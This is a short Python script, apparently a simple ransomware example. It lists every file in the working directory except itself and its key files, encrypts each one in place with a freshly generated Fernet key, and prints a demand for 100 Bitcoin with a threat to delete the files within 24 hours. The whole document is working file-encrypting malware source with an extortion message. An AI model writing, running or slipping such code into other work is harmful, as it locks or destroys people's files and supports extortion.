
import os 
from cryptography.fernet import Fernet
#lets find some files 

files = []

for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":	#if file  is voldemort.py the dont add
		continue
	if os.path.isfile(file):	#iff it is a file add it to the list
		files.append(file)

print(files)


key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

# this loop will go through each file in the files list and encrypt each one with the key
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All of your files have been encrypted!! Send me 100 Bitcoin or I will delete them in 24 hours... ")
